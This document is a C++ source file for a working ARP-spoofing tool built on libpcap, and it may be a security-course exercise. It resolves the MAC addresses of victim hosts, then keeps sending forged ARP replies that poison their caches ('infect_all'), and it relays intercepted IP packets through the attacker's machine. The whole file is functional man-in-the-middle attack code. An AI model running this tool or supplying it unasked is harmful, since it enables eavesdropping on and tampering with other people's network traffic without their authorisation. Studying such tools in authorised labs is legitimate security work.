#include <cstdio>
#include <cstdlib>
#include <iostream>
#include <thread>
#include <string>
#include <map>
#include <vector>
#include <algorithm>

#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"
#include "mac.h"
#include "ip.h"

#include <pcap.h>
#include <sys/ioctl.h> // struct ifreq, ioctl
#include <net/if.h> // ..
#include <sys/socket.h> // socket
#include <unistd.h> // close(fd)
#include <netinet/in.h> // htons

using namespace std;

#pragma pack(push, 1)

enum packet_type {
    ARP=1,
    IP=2,
};

struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

struct EthIpPacket final {
    EthHdr eth_;
    IpHdr ip_;
};

struct User {
    Mac mac;
    Ip ip;
};

struct User_pair {
    User sender;
    User target;
};

#pragma pack(pop)

void usage() {
    cout << "syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n";
    cout << "sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n";
}

Mac get_mymac(const char* dev){
    struct ifreq ifr;
    u_char ret[32]={0,};

    int sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_IP);
    if(sock==-1){
        cerr << "mac socket open error\n";
        close(sock);
        exit(1);
    }

    strncpy(ifr.ifr_name,dev,IFNAMSIZ);
    if(ioctl(sock,SIOCGIFHWADDR,&ifr)!=0){
        cerr << "mac ioctl error\n";
        close(sock);
        exit(1);
    }

    close(sock);
    memcpy(ret,ifr.ifr_hwaddr.sa_data,6);
    return Mac(ret);

}

Ip get_myip(const char *dev){
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock==-1){
        cerr << "ip socket open error\n";
        close(sock);
        exit(1);
    }

    ifr.ifr_addr.sa_family=AF_INET;
    strncpy(ifr.ifr_name,dev,IFNAMSIZ);
    if(ioctl(sock,SIOCGIFADDR,&ifr)!=0){
        cerr << "ip ioctl error\n";
        close(sock);
        exit(1);
    }

    close(sock);
    return Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

}

EthArpPacket* make_arp_packet(struct User source, struct User target, uint16_t opcode){
    EthArpPacket* packet=new EthArpPacket();

    packet->eth_.dmac_ = (opcode==ArpHdr::Request)?target.mac.broadcastMac():target.mac;
    packet->eth_.smac_ = source.mac;
    packet->eth_.type_ = htons(EthHdr::Arp);

    packet->arp_.hrd_ = htons(ArpHdr::ETHER);
    packet->arp_.pro_ = htons(EthHdr::Ip4);
    packet->arp_.hln_ = Mac::SIZE;
    packet->arp_.pln_ = Ip::SIZE;
    packet->arp_.op_ = htons(opcode);
    packet->arp_.smac_ = source.mac;
    packet->arp_.sip_ = htonl(source.ip);
    packet->arp_.tmac_ = (opcode==ArpHdr::Request)?target.mac.nullMac():target.mac;
    packet->arp_.tip_ = htonl(target.ip);

    return packet;
}

int send_packet(pcap_t* handle,const u_char* packet,size_t size){

    int res = pcap_sendpacket(handle,packet,size);
    if (res != 0) {
        cerr << "pcap_sendpacket return " << res << " error=" << pcap_geterr(handle) << "\n";
        return 0;
    }
    return 1;

}

EthArpPacket* recv_arp(pcap_t* handle, struct User source, struct User target){
    EthArpPacket* ret=new EthArpPacket();

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res=pcap_next_ex(handle,&header,&packet);
        if(res==0)continue;
        if(res==PCAP_ERROR||res==PCAP_ERROR_BREAK){
            cout << "pcap_next_ex return " << res << "(" << pcap_geterr(handle) << ")\n";
            break;
        }

        ret = (EthArpPacket*)packet;

        if(ret->eth_.type_!=htons(EthHdr::Arp))continue;
        if(ret->arp_.tip_!=htonl(source.ip))continue;
        if(ret->arp_.sip_!=htonl(target.ip))continue;
        if(ret->arp_.op_!=htons(ArpHdr::Reply))continue;

        break;
    }

    return ret;
}

void make_arp_table(pcap_t* handle,struct User attacker,vector<struct User_pair> &Info){
    for(auto &user_pair:Info){
        EthArpPacket* packet=make_arp_packet(attacker,user_pair.sender,ArpHdr::Request);
        if(send_packet(handle,reinterpret_cast<const u_char*>(packet),sizeof(EthArpPacket))==0){
             cerr << "request sender mac error\n";
             continue;
        }

        packet=recv_arp(handle,attacker,user_pair.sender);
        if(packet==nullptr){
            cerr << "recv arp error\n";
            continue;
        }

        user_pair.sender.mac=Mac(packet->arp_.smac());

        cout << "Sender's IP: " << string(user_pair.sender.ip) << "\n";
        cout << "Sender's Mac: " << string(user_pair.sender.mac) << "\n";

        packet=make_arp_packet(attacker,user_pair.target,ArpHdr::Request);
        if(send_packet(handle,reinterpret_cast<u_char*>(packet),sizeof(EthArpPacket))==0){
             cerr << "request sender mac error\n";
             continue;
        }

        packet=recv_arp(handle,attacker,user_pair.target);
        if(packet==nullptr){
            cerr << "recv arp error\n";
            continue;
        }

        user_pair.target.mac=Mac(packet->arp_.smac());
    }
    return;
}

void infect_all(pcap_t* handle,vector<struct User_pair> &info,struct User attacker){
    //every 10 second
    while(1){
        for(auto &user_pair:info){
            struct User jjambbong = {attacker.mac,user_pair.target.ip};
            EthArpPacket* packet=make_arp_packet(jjambbong,user_pair.sender,ArpHdr::Reply);
            if(send_packet(handle,reinterpret_cast<u_char*>(packet),sizeof(EthArpPacket))==0){
                fprintf(stderr,"failed to infect %s\n",string(user_pair.sender.ip).c_str());
                continue;
            }
            this_thread::sleep_for(500ms);
        }
        this_thread::sleep_for(10000ms);
    }
    return;
}

void relay_packet(pcap_t* handle,struct User attacker,vector<struct User_pair> &info){
    struct pcap_pkthdr* header;
    const u_char* packet;
    struct EthHdr* ethernet_header;
    while(1){
        int res=pcap_next_ex(handle,&header,&packet);
        if(res==0)continue;
        if(res==PCAP_ERROR||res==PCAP_ERROR_BREAK){
            cout << "pcap_next_ex return " << res << "(" << pcap_geterr(handle) << ")\n";
            break;
        }

        ethernet_header=(EthHdr*)packet;
        if(ethernet_header->type_==htons(EthHdr::Arp)){
            cout<<"recv arp packet\n";
            cout<<string(ethernet_header->smac())<<" "<<string(ethernet_header->dmac())<<"\n";
            struct ArpHdr* arp_header=(ArpHdr*)(ethernet_header+1);

            if(arp_header->op_!=ArpHdr::Request){
                continue;
            }
            for(auto &user_pair:info){
                if(arp_header->sip()==user_pair.sender.ip&&arp_header->tip()==user_pair.target.ip){
                    struct User jjambbong = {attacker.mac,user_pair.target.ip};
                    EthArpPacket* packet=make_arp_packet(jjambbong,user_pair.sender,ArpHdr::Reply);
                    if(send_packet(handle,reinterpret_cast<u_char*>(packet),sizeof(EthArpPacket))==0){
                        fprintf(stderr,"failed to infect %s\n",string(user_pair.sender.ip).c_str());
                        continue;
                    }
                }
            }
        }

        else if(ethernet_header->type_==htons(EthHdr::Ip4)){
            struct IpHdr* ip_header=(IpHdr*)(ethernet_header+1);
            //cout<<"recv ip packet\n";
            for(auto &user_pair:info){
                if(ethernet_header->smac()==user_pair.sender.mac){
                    cout<<"relaying packet to "<<string(user_pair.sender.mac)<<" "<<string(ethernet_header->dmac())<<" "<<string(ip_header->ip_src())<<" "<<string(ip_header->ip_dst())<<"\n";
                    EthIpPacket* sending_packet=(EthIpPacket*)packet;
                    sending_packet->eth_.smac_=attacker.mac;
                    sending_packet->eth_.dmac_=user_pair.target.mac;
                    if(send_packet(handle,reinterpret_cast<u_char*>(sending_packet),header->caplen)==0){
                        fprintf(stderr,"failed to relay ip packet to %s\n",string(user_pair.sender.ip).c_str());
                        continue;
                    }
                }
            }
        }
    }
    return;
}

int main(int argc, char* argv[]) {
    if (argc % 2 != 0 || argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

    vector<struct User_pair> Info;

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
        cerr << "couldn't open device " << dev << "(" << errbuf << ")\n";
		return -1;
	}

    map<Ip,Mac> arp_table;

    struct User attacker={get_mymac(dev),get_myip(dev)};
    cout << "Attacker's IP: " << string(attacker.ip) << "\n";
    cout << "Attacker's Mac: " << string(attacker.mac) << "\n";

    for(int i=2;i<argc;i+=2){
        struct User sender,target;

        sender.ip=Ip(argv[i]);
        target.ip=Ip(argv[i+1]);

        struct User_pair s_t;
        s_t.sender=sender;
        s_t.target=target;
        Info.push_back(s_t);
    }

    make_arp_table(handle,attacker,Info);

    cout<<"Arp table construction finished\n";

    thread* infect_thread=new thread(infect_all,handle,ref(Info),attacker);
    thread* relay_thread=new thread(relay_packet,handle,attacker,ref(Info));

    infect_thread->join();
    relay_thread->join();

	pcap_close(handle);
}
